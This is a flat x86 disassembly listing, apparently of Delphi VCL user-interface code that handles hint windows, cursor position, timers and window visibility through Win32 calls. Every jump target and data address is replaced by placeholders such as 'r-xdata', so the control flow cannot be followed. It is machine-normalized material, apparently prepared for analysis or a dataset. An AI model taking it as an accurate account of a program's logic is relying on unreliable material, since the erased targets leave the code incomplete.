call sub_3acf71c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acf95a
lea eax [ ebp - 0x108 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x4 ]
call sub_3a69f28
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_3a63e24
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_3a63950
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a6556c
sub_3acf970
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov esi eax
xor edi edi
mov [ esp + 0x4 ] 0x1
lea eax [ esp + 0x4 ]
push eax
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax esi
call sub_3acfa98
mov ebx eax
test bl bl
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
test edi edi
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_3ab7fd8
test al al
je r-xdata
mov eax edi
call sub_3ab7e70
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x4 ] 0x0
cmp [ esi + 0xac ] 0x0
jne r-xdata
mov eax [ esi + 0x30 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x284 ] 0x0
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
movzx eax bp
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_3ad0180
test al al
je r-xdata
call sub_3ab7c38
mov [ esp + 0x8 ] eax
mov eax edi
call sub_3ab7c38
mov [ esp + 0x8 ] eax
mov eax esi
call sub_3ad0180
test al al
je r-xdata
cmp [ edi + 0x268 ] 0x0
jne r-xdata
push ebp
mov eax [ esp + 0x4 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
push ebp
mov eax [ esp + 0x4 ]
push eax
mov ecx [ edi + 0x284 ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov [ esp + 0x4 ] 0x0
sub_3acfa98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
xor esi esi
mov eax [ rw-data ]
mov eax [ eax + 0x64 ]
test eax eax
je r-xdata
test bl bl
jne r-xdata
xor edx edx
call sub_3ac463c
mov esi eax
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
test eax eax
je r-xdata
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
test bl bl
jne r-xdata
cmp esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x11a ] 0x0
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov ebx eax
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
mov ebx eax
sub_3acfb64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_3acfbe2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov eax edi
call sub_3a65730
mov ecx eax
mov dx 0x102
mov eax esi
call sub_3acfa98
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acfbe9
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
mov eax esi
call sub_3ad0180
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_3ad0adc
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
sub_3acfbf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_3acfc6b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov ecx edi
mov dx 0x1
mov eax esi
call sub_3acfa98
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acfc72
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
mov eax esi
call sub_3ad0180
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_3ad0adc
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
sub_3acfc94
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_3a64380
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_3aafd28
jmp r-xdata
sub_3acfce4
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_3acc974
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_3ab7c38
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_3acc960
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax ebx
call sub_3ab7c38
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
sub_3acfd48
push ebx
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_3aae0f8
cmp eax [ ebx + 0x48 ]
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov [ ebx + 0x48 ] eax
sub_3acfd6c
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_3acfdb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
push eax
push 0x0
call KillTimer
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_3acfce4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3acfdd4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3acff21
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3acfd48
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_3acd56c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_3aac894
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3acffcc
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_3acfec8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x12a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov eax [ ebp - 0x4 ]
call sub_3ad03d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xc0 ]
test ebx ebx
jg r-xdata
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3acfce4
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_3a82e54
test al al
je r-xdata
push sub_3acfd6c
push ebx
push 0x0
push 0x0
call SetTimer
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acff28
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_3a652c4
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_3acfce4
sub_3acff30
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_3acc958
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_3acc944
movzx edx di
xor ecx ecx
call sub_3ab0e78
inc esi
dec ebx
jne r-xdata
sub_3acff6c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_3ac4004
test eax eax
je r-xdata
mov eax ebx
call sub_3aceb7c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call __imp_SendMessageA
mov eax ebx
call sub_3aceb7c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_3acff30
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_3acffcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_3a656c8
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_3a652f4
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aa1868
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3ac0f38
xor eax eax
push ebp
push sub_3ad0051
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
jmp r-xdata
sub_3ad0060
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ad1240
test al al
je r-xdata
movzx eax bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
cmp [ rw-data ] 0x0
jne r-xdata
push 0xffffffec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x30 ]
push esi
call GetWindowLongA
or eax 0x8000000
push eax
push 0xffffffec
mov eax [ ebp + 0x8 ]
push esi
call SetWindowLongA
sub_3ad00f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_3acc958
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_3ad0060
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_3acc944
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_3ad0060
pop ecx
jmp r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebx + 0x1c4 ]
push eax
mov eax ebx
call sub_3ab7c38
push eax
call IsChild
test eax eax
jne r-xdata
sub_3ad01a0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_3ad01e4
push sub_3acd5c4
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_3ad03d8
sub_3ad020c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp ecx
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xc ]
mov [ esp + 0x10 ] eax
movsx eax [ esp + 0xe ]
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_3aaf610
lea eax [ esp + 0x24 ]
mov dl 0x1
call sub_3aae0f8
call sub_3acd5a4
mov edi eax
test edi edi
je r-xdata
mov eax esi
call sub_3ad03d8
jmp r-xdata
cmp [ edi + 0x8d ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x60 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esp + 0x18 ] eax
movsx eax [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
movsx eax [ esp + 0x1a ]
mov [ esp + 0x20 ] eax
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_3aaf610
push [ esp + 0x28 ]
push [ esp + 0x28 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
neg eax
mov al 0x1
jmp r-xdata
movzx ebx [ esi + 0x58 ]
test bl bl
je r-xdata
test al al
je r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_3ad03d8
mov [ esi + 0x58 ] bl
mov [ esi + 0x60 ] edi
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_3ad01a0
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
movzx ecx bl
mov edx 0xb041
mov eax edi
call sub_3ab0e78
test bl bl
je r-xdata
mov [ esi + 0x58 ] bl
mov [ esi + 0x60 ] edi
lea eax [ esp + 0x4 ]
push eax
call GetCursorPos
lea edx [ esp + 0x4 ]
mov eax esi
call sub_3ad0678
jmp r-xdata
sub_3ad032c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_3ad01e4
movzx eax [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_3ad0678
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_3ad0364
jmp r-xdata
sub_3ad0364
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_3ab7c38
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0xf0 ]
test al al
je r-xdata
mov cl 0x1
mov edx [ ebx + 0x74 ]
mov eax ebx
call sub_3ad01a0
push 0x0
mov eax [ ebx + 0x84 ]
call sub_3ab7c38
push eax
call ShowWindow
xor edx edx
mov eax [ ebx + 0x84 ]
call sub_3aafaa8
jmp r-xdata
sub_3ad03d8
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_3ad0364
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_3acd72c
mov eax ebx
call sub_3ad01e4
sub_3ad0410
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_3ad0554
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_3a8b600
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_3a62ec8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_3ad0525
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_3a8b6bc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad052c
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_3a62efc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_3ad0400
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_3ad0400
mov [ ebp - 0x4 ] eax
sub_3ad052c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_3ad0568
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_3a64380
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_3a64258
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_3ad05c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
xor edx edx
push ebp
push sub_3ad0666
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad066d
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
movzx eax [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_3a65390
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x250 ]
mov edx [ ebp - 0x4 ]
call sub_3a8a19c
mov edi eax
cmp edi [ ebp - 0x8 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x8 ] edi
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_3a6dfa0
mov ebx eax
inc ebx
sub_3ad0678
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
call sub_3a65d1c
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_3ad0a06
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_3ad03d8
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_3ad01a0
jmp r-xdata
mov eax [ ebx ]
call sub_3ad12ac
call sub_3ac43e0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad0a0d
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
call sub_3a65dec
retn
lea eax [ ebp - 0x4c ]
mov dl 0x1
call sub_3aae0f8
call sub_3acd5a4
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x38 ] eax
call sub_3ad0410
add [ ebp - 0x38 ] eax
mov eax [ rw-data ]
call sub_3acc8d8
mov [ ebp - 0x34 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_3aaf4a0
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x54 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x58 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x58 ]
sub eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x5c ]
sub eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x4c ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_3aaf6c0
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_3acd56c
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_3aac850
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0xc ]
call sub_3a65338
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_3ab0e78
test eax eax
sete [ ebp - 0x5d ]
cmp [ ebp - 0x5d ] 0x0
je r-xdata
cmp [ esi + 0x1c4 ] 0x0
je r-xdata
cmp [ ebp - 0x5d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x15a ] 0x0
je r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ esi + 0x1c4 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x5d ]
lea edx [ ebp - 0xc ]
mov esi [ ebx ]
mov eax [ esi + 0x15c ]
call [ esi + 0x158 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0xc ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x40 ]
call sub_3ad0568
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
movzx edx [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x6d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x34 ]
mov esi [ eax ]
call [ esi + 0xe8 ]
mov eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x6d ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc7
call sub_3a6457c
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_3aaf610
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_3aaf610
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x30 ]
call sub_3aafd28
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0xc ]
lea edx [ ebp - 0x6d ]
mov esi [ eax ]
call [ esi + 0xe4 ]
call sub_3acd6b8
mov eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0xc ]
call sub_3ad05c8
pop ecx
add eax 0x5
